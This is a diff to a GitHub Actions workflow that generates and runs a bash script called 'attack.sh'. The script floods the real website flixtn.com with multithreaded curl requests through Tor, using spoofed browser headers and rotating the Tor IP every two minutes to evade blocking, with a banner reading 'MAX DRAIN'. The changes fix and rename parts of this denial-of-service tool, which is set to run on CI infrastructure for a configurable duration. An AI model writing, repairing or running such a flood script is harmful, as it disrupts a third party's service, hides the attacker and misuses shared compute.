@@ -1,4 +1,4 @@
-name: 💀 CURL + TOR - CHALLENGE FOCUS
+name: 💀 CURL + TOR - FIXED
 
 on:
   workflow_dispatch:
@@ -6,7 +6,7 @@ on:
       duration:
         description: 'المدة بالدقائق'
         required: true
-        default: '6000'
+        default: '60'
       threads:
         description: 'عدد الخيوط'
         required: true
@@ -24,9 +24,9 @@ jobs:
           sudo apt install -y curl tor
           sudo systemctl start tor
           
-      - name: 🔥 CURL + TOR ATTACK
+      - name: 🔥 CURL + TOR
         run: |
-          cat > curl_tor.sh << 'EOF'
+          cat > attack.sh << 'EOF'
           #!/bin/bash
           
           TARGET="https://flixtn.com"
@@ -34,10 +34,7 @@ jobs:
           THREADS=${{ github.event.inputs.threads }}
           
           TOTAL=0
-          OK=0
-          RATE=0
-          BLOCK=0
-          FAIL=0
+          LAST=0
           
           echo "=========================================="
           echo "💀 CURL + TOR - MAX DRAIN"
@@ -50,26 +47,23 @@ jobs:
           echo ""
           
           END=$((SECONDS + DURATION))
-          LAST_TOTAL=0
           
-          # تجديد Tor كل دقيقتين
-          renew_tor() {
+          # تجديد Tor
+          renew() {
             sudo systemctl reload tor
-            echo "🔄 Tor IP changed"
+            echo ""
+            echo "🔄 TOR IP CHANGED"
+            echo ""
           }
           
-          # تشغيل تجديد Tor في الخلفية
-          (
-            while [ $SECONDS -lt $END ]; do
-              sleep 120
-              renew_tor
-            done
-          ) &
+          # تشغيل تجديد Tor
+          (while true; do sleep 120; renew; done) &
           
           while [ $SECONDS -lt $END ]; do
             for i in $(seq 1 $THREADS); do
               (
-                STATUS=$(proxychains4 -q curl -s -o /dev/null -w "%{http_code}" "$TARGET" \
+                # استخدام curl مع socks5h مباشرة
+                STATUS=$(curl -s -o /dev/null -w "%{http_code}" --socks5-hostname 127.0.0.1:9050 "$TARGET" \
                   -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
                   -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9" \
                   -H "Accept-Language: ar,en;q=0.9" \
@@ -88,17 +82,16 @@ jobs:
             
             wait
             TOTAL=$((TOTAL + THREADS))
-            
-            RPS=$((TOTAL - LAST_TOTAL))
-            LAST_TOTAL=$TOTAL
+            RPS=$((TOTAL - LAST))
+            LAST=$TOTAL
             
             ELAPSED=$((SECONDS - (END - DURATION)))
-            REMAIN=$((END - SECONDS))
             MIN=$((ELAPSED / 60))
             SEC=$((ELAPSED % 60))
+            REMAIN=$(( (END - SECONDS) / 60 ))
             
             echo ""
-            echo "[$MIN:$SEC] Total: $TOTAL | RPS: $RPS | Remaining: $((REMAIN / 60))m"
+            echo "[$MIN:$SEC] Total: $TOTAL | RPS: $RPS | Remaining: ${REMAIN}m"
             echo ""
             
             sleep 0.1
@@ -111,5 +104,5 @@ jobs:
           echo "=========================================="
           EOF
           
-          chmod +x curl_tor.sh
-          ./curl_tor.sh
+          chmod +x attack.sh
+          ./attack.sh
